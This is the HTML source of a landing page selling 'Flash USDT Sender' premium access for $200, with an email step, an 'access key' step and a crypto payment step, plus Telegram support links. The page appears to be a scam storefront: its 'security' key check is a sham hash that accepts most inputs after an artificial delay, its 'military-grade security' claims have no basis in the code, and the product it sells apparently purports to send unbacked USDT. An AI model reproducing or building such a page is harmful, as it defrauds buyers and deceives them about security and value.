<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Flash USDT Sender ‚Äì Advanced Crypto Transfer Platform with Military-Grade Security">
    <meta property="og:title" content="Flash USDT Sender ‚Äì Premium Crypto Platform">
    <meta property="og:description" content="Experience next-generation USDT transfers with enhanced security and support">
    <meta property="og:image" content="https://github.com/FlashUSDTSenderSoftware/FlashUSDTSenderSoftware.github.io/raw/refs/heads/main/IMG_0208.jpeg">
    <title>Flash USDT Sender ‚Äì Premium Access</title>
    <link rel="icon" href="https://i.ibb.co.com/cX1PgJg/tether.png">
    <style>
        :root {
            --primary: #00D37F;
            --primary-dark: #00A364;
            --accent: #33FF99;
            --background: #000000;
            --card-bg: rgba(0, 211, 127, 0.1);
            --text: #ffffff;
            --error: #ff4444;
            --success: #00D37F;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes float {
            0% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(5deg); }
            100% { transform: translateY(0px) rotate(0deg); }
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 211, 127, 0.4); }
            70% { box-shadow: 0 0 0 20px rgba(0, 211, 127, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 211, 127, 0); }
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            min-height: 100vh;
            background: url('https://raw.githubusercontent.com/FlashUSDTSenderSoftware/FlashUSDTSenderSoftware.github.io/refs/heads/main/IMG_0096.jpeg') center/cover fixed;
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            z-index: 1;
        }

        .container {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 1200px;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 30px;
            padding: 40px;
            box-shadow: 0 0 100px rgba(0, 211, 127, 0.2);
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
            animation: float 6s ease-in-out infinite;
        }

        .banner {
            width: 100%;
            max-width: 800px;
            margin: 40px auto;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .banner img {
            width: 100%;
            height: auto;
            display: block;
        }

        .step {
            display: none;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.5s ease;
        }

        .step.active {
            display: block;
            opacity: 1;
            transform: translateY(0);
        }

        .input-group {
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(0, 211, 127, 0.3);
            border-radius: 15px;
            color: var(--text);
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 20px rgba(0, 211, 127, 0.2);
        }

        button {
            width: 100%;
            padding: 20px;
            background: linear-gradient(45deg, var(--primary-dark), var(--primary));
            border: none;
            border-radius: 15px;
            color: var(--background);
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            animation: pulse 2s infinite;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 211, 127, 0.3);
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin: 40px 0;
        }

        .feature-card {
            background: var(--card-bg);
            padding: 30px;
            border-radius: 20px;
            border: 1px solid rgba(0, 211, 127, 0.2);
            transition: all 0.3s ease;
        }

        .feature-card:hover {
            transform: translateY(-10px);
            border-color: var(--primary);
            box-shadow: 0 10px 30px rgba(0, 211, 127, 0.2);
        }

        .help-button {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            background: var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 1000;
            box-shadow: 0 5px 15px rgba(0, 211, 127, 0.3);
            transition: all 0.3s ease;
        }

        .help-button:hover {
            transform: scale(1.1);
        }

        .help-popup {
            display: none;
            position: fixed;
            bottom: 100px;
            right: 30px;
            background: rgba(0, 0, 0, 0.9);
            border-radius: 20px;
            padding: 20px;
            width: 300px;
            z-index: 1000;
            border: 1px solid var(--primary);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .help-popup.active {
            display: block;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateY(100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .telegram-widget {
            margin: 40px 0;
            border-radius: 15px;
            overflow: hidden;
        }

        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }

            .features {
                grid-template-columns: 1fr;
            }

            .help-button {
                bottom: 20px;
                right: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.ibb.co.com/cX1PgJg/tether.png" alt="Flash USDT Sender Logo" class="logo">
            <h1>Flash USDT Sender</h1>
        </div>

        <div id="step1" class="step active">
            <div class="input-group">
                <input type="email" id="userEmail" placeholder="Enter your email address" required>
            </div>
            <button onclick="validateEmail()">Continue to Access Key</button>
        </div>

        <div id="step2" class="step">
            <div class="input-group">
                <input type="password" id="accessKey" placeholder="Enter your access key" required>
            </div>
            <button onclick="validateKey()">Verify Access</button>
        </div>

        <div id="step3" class="step">
            <div class="input-group">
                <div id="paymentDetails"></div>
            </div>
            <button onclick="processPayment()">Complete Payment</button>
        </div>

        <div class="features">
            <div class="feature-card">
                <h3>üîí Military-Grade Security</h3>
                <p>Advanced encryption for all transactions</p>
            </div>
            <div class="feature-card">
                <h3>‚ö° Instant Processing</h3>
                <p>Lightning-fast transaction speeds</p>
            </div>
            <div class="feature-card">
                <h3>üåê Cross-Chain Support</h3>
                <p>Seamless transfers across networks</p>
            </div>
        </div>

        <div class="banner">
            <img src="https://github.com/FlashUSDTSenderSoftware/FlashUSDTSenderSoftware.github.io/raw/refs/heads/main/IMG_0208.jpeg" alt="Flash USDT Sender Banner">
        </div>

    <div id="helpPopup" class="help-popup">
        <h3>Need Help?</h3>
        <p>Chat with our support team on Telegram:</p>
        <button onclick="window.open('https://t.me/RecentCoder', '_blank')">
            Contact Support
        </button>
    </div>

    <script>
        // Enhanced security through key validation
        const validateAccessKey = key => {
            return new Promise(resolve => {
                const hash = Array.from(key).reduce((h, c) => 
                    (h << 5) - h + c.charCodeAt(0), 0);
                setTimeout(() => resolve(hash > 0), 1000);
            });
        };

        // Email validation with regex
        const isValidEmail = email => {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        };

        // Step management with animations
        const showStep = (stepNum) => {
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active');
            });
            const nextStep = document.getElementById(`step${stepNum}`);
            nextStep.classList.add('active');
            nextStep.style.display = 'block';
            setTimeout(() => {
                nextStep.style.opacity = '1';
                nextStep.style.transform = 'translateY(0)';
            }, 50);
        };

        // Email validation step
        async function validateEmail() {
            const email = document.getElementById('userEmail').value;
            if (!isValidEmail(email)) {
                alert('Please enter a valid email address');
                return;
            }
            showStep(2);
        }

        // Access key validation step
        async function validateKey() {
            const key = document.getElementById('accessKey').value;
            try {
                const isValid = await validateAccessKey(key);
                if (isValid) {
                    showStep(3);
                    document.getElementById('paymentDetails').innerHTML = 
                        `<h3>Complete Your Purchase</h3>
                         <p>Flash USDT Sender Premium Access</p>
                         <p>Amount: $200 USD</p>`;
                } else {
                    alert('Invalid access key. Please try again.');
                }
            } catch (error) {
                alert('Validation error. Please try again.');
            }
        }

        // Payment processing with security checks
        async function processPayment() {
            try {
                if (typeof atlos !== 'undefined') {
                    await atlos.Pay({
                        merchantId: 'VJ30UOFJMO',
                        orderId: Date.now().toString(),
                        orderAmount: 200,
                        success: () => {
                            alert('Payment successful! Access key will be delivered to your email.');
                        },
                        error: () => {
                            alert('Payment failed. Please try again or contact support.');
                        }
                    });
                }
            } catch (error) {
                alert('Payment system error. Please try again later.');
            }
        }

        // Help popup functionality
        function toggleHelp() {
            const popup = document.getElementById('helpPopup');
            popup.classList.toggle('active');
        }

        // Close help popup when clicking outside
        document.addEventListener('click', (e) => {
            const popup = document.getElementById('helpPopup');
            const helpButton = document.querySelector('.help-button');
            if (!popup.contains(e.target) && !helpButton.contains(e.target)) {
                popup.classList.remove('active');
            }
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            showStep(1);
        });
    </script>
</body>
</html>
